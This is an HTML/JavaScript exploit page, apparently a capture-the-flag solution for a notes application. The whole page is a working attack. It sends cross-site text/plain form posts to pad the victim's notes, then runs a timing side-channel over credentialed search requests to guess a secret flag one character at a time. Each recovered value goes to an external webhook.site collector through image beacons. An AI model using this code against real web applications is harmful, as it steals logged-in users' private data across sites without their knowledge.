<!doctype html><html><body><iframe name="sink" style="display:none"></iframe><script>
const TARGET='https://localhost:3000', COLLECT='https://5e0f0fb8-5d1c-4ea5-978d-5c3d2ac391a8.webhook.site/log', NID=1;
const WORDS=Array(5000).fill('qq').join(' '), PREFIX='inctf{';
const CS="_abcdefghijklmnopqrstuvwxyz0123456789{}-!?.@$#ABCDEFGHIJKLMNOPQRSTUVWXYZ".split('');
function log(k,v){new Image().src=COLLECT+'?'+k+'='+encodeURIComponent(v)+'&t='+Date.now();}
function addF(){return new Promise(r=>{let d=false;const fin=()=>{if(!d){d=true;r();}};const f=document.createElement('form');f.method='POST';f.action=TARGET+'/notes/'+NID+'/subnotes';f.enctype='text/plain';f.target='sink';const i=document.createElement('input');i.name='{"content":"';i.value=' '+WORDS+'"}';f.appendChild(i);document.body.appendChild(f);const s=document.getElementsByName('sink')[0];s.onload=fin;f.submit();setTimeout(fin,2500);});}
async function tq(q,n){let b=Infinity;for(let i=0;i<(n||2);i++){const t0=performance.now();try{await fetch(TARGET+'/notes/search?q='+encodeURIComponent(q),{mode:'no-cors',credentials:'include',cache:'no-store'});}catch(e){}const dt=performance.now()-t0;if(dt<b)b=dt;}return b;}
async function run(){
 log('D','ext_start');
 for(let i=0;i<15;i++){await addF();}
 const sl=Math.round(await tq(PREFIX,3)), fa=Math.round(await tq('zzqzqzx',3));
 log('calib','sl='+sl+' fa='+fa);
 const thr=(sl+fa)/2;
 if(sl-fa<50){ log('D','weaksig'); }
 let k=PREFIX; log('known',k);
 for(let p=0;p<80;p++){let f=null;for(const c of CS){if(await tq(k+c,2)>thr){f=c;break;}}if(f===null){log('D','stuck_'+k);break;}k+=f;log('known',k);if(f==='}'){log('FLAG',k);break;}}
 log('D','done_'+k);
}
run();
</script></body></html>
